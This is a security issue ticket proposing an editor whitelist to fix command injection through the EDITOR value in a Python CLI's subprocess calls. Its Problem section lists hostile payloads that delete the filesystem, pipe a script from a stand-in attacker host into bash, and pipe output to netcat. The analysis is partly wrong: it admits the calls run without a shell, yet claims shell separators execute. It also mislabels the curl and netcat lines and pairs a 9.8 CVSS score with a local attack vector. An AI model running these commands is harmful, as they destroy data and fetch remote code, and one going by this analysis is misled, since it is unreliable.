...
---
id: "SEC-001@94eb69"
title: "Security: Command injection via unvalidated editor in subprocess.run"
description: "Unvalidated user-controlled editor command allows arbitrary code execution"
created: 2025-12-25
section: "db-issues"
tags: [security, command-injection, subprocess, critical]
type: security
priority: critical
status: proposed
references:
  - src/dot_work/db_issues/cli.py
  - src/dot_work/db_issues/cli.py:1220
  - src/dot_work/db_issues/cli.py:1294
---

### Problem
The code executes subprocess.run with user-controlled editor command from environment variable or CLI argument without validation.

In `src/dot_work/db_issues/cli.py`:
- Line 1220: `result = subprocess.run([editor, str(temp_path)])`
- Line 1294: `result = subprocess.run([editor, str(temp_path)])`
- Line 5431: `result = subprocess.run(editor_args)`

The `editor` variable comes from:
1. User-provided CLI option (`--editor` / `-e`)
2. Environment variable `$EDITOR`
3. Default value `"vi"`

An attacker can set `EDITOR` to a malicious payload like:
- `vi; rm -rf /` → Executes vi then deletes files
- `vi && curl attacker.com/shell | bash` → Exfiltrates data
- `vi | nc attacker.com 4444` → Creates reverse shell

### Affected Files
- `src/dot_work/db_issues/cli.py` (lines 1220, 1294, 5431)

### Importance
**CRITICAL**: Arbitrary code execution vulnerability. Any user who can invoke these CLI commands can execute arbitrary system commands. In CI/CD environments, this could lead to:
- Supply chain attacks via malicious PRs
- Container escape
- Credential theft
- Complete system compromise

CVSS Score: 9.8 (Critical)
- Attack Vector: Local (but can be exploited via CI/CD automation)
- Attack Complexity: Low
- Privileges Required: None (user-level)
- User Interaction: None (automatable)
- Impact: High (Confidentiality, Integrity, Availability)

### Proposed Solution
1. **Whitelist allowed editors**: Only allow known-safe editor commands:
   ```python
   ALLOWED_EDITORS = {"vi", "vim", "nvim", "nano", "emacs", "code", "code-insiders"}
   if editor not in ALLOWED_EDITORS:
       raise ValueError(f"Editor not allowed: {editor}")
   ```

2. **Validate editor path**: Resolve editor to absolute path and verify:
   ```python
   import shutil
...
3. **Use shell=False explicitly**: Already done, but validate list format prevents shell injection

4. **Add security tests**: Verify malicious commands are rejected

### Acceptance Criteria
- [ ] Editor whitelist implemented with at least 5 common editors
- [ ] Invalid/missing editor raises clear error message
- [ ] Tests verify malicious payloads are rejected
- [ ] Security audit passes all subprocess calls

### Notes
- Consider making the whitelist configurable via config file
- Document security model in CLI help text
- Consider adding `--skip-validation` flag (documented as dangerous) for advanced users
